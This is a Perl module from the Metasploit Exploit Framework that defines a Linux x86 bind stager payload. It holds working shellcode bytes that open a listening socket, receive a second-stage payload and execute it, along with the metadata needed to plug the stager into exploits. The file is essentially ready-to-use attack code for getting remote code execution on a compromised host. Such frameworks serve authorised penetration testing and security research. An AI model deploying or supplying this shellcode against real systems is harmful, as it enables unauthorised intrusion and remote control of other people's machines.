###############
##
#
#    Name: BindStager.pm
# Version: $Revision$
#  Source: src/shellcode/linux/ia32/stager_sock_bind.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 bind stager for Linux.
#
##
###############

package Msf::PayloadComponent::Linux::ia32::BindStager;

use strict;
use base 'Msf::PayloadComponent::Linux::BindStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>' ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'linux' ],
	Multistage    => 1,
	Size          => '',
	Payload       =>
		{
			Offsets => 
				{
					LPORT => [ 0x14, 'n' ],
				},
			Payload =>
				"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96" .
				"\x43\x52\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56" .
				"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1" .
				"\xb0\x66\xcd\x80\x93\xb6\x0c\xb0\x03\xcd\x80\x89\xdf\xff\xe1"
		}
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
